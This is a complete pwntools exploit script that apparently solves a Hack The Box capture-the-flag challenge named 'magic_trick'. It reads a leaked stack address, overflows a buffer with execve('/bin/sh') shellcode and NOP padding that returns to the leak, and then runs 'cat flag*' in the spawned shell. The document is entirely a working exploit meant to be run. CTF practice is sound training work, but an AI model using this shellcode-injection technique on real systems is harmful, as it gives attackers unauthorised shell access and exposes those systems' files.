#!/usr/bin/python3.8
from pwn import *
import warnings
import os
warnings.filterwarnings('ignore')
context.arch = 'amd64'
context.log_level = 'critical'

fname = './magic_trick' 

LOCAL = False

os.system('clear')

if LOCAL:
  print('Running solver locally..\n')
  r    = process(fname)
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
  r    = remote(IP, PORT)
  print(f'Running solver remotely at {IP}:{PORT}\n')

# Read stack leak
r.recvuntil("is '")
leak = int(r.recvuntil("'")[:-1], 16)
print(f'Leak: {leak:#04x}')

# Proceed to Bof
r.sendlineafter('>> ', 'y')

# Craft the shellcode payload
sc = asm(shellcraft.execve('/bin/sh'))

r.sendlineafter('>> ', sc.ljust(0x48, b'\x90') + p64(leak))

# Read flag
pause(1)
r.sendline('cat flag*')
print(f'\nFlag --> {r.recvline_contains(b"HTB").strip().decode()}\n')